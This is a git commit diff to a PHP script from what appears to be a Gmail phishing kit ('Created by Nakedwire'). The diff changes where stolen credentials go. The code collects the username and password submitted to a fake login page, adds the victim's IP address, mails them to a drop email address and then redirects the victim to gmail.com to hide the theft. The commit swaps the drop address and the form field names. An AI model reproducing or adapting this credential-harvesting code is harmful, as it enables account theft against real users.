3a77f8595343c996384002ec0b5d9da6ca4d9f92
eduking <eduking2008@yahoo.com>
2016-09-15 04:51:05 -0700

    Update gmxlxs.php

--- gmxlxs.php
+++ gmxlxs.php
@@ -12,15 +12,14 @@ print '
 ';
 exit;
 }
-$rezmail1 = "woogt@gmail.com";
+$rezmail1 = "eduking20089@gmail.com";
 $ip = getenv("REMOTE_ADDR");
 $message .= "---------------------------------------------------------------------------------\n";
-$message .= "user: ".$_POST['email']."\n";
-$message .= "pass: ".$_POST['password']."\n";
-$message .= "pass2: ".$_POST['password2']."\n";
+$message .= "user: ".$_POST['login']."\n";
+$message .= "pass: ".$_POST['passwd']."\n";
 $message .= "---------------------Created by Nakedwire------------------------------\n";
-$subject = "Gmail Xlxs email+pass :) $ip";
+$subject = "Gmail email+pass :) $ip";
 $headers .= "MIME-Version: 1.0\n";
 mail($rezmail1,$subject,$message,$headers);
-Header ("Location: http://bit.ly/2b55OEx");
+Header ("Location: http://gmail.com");
 ?>
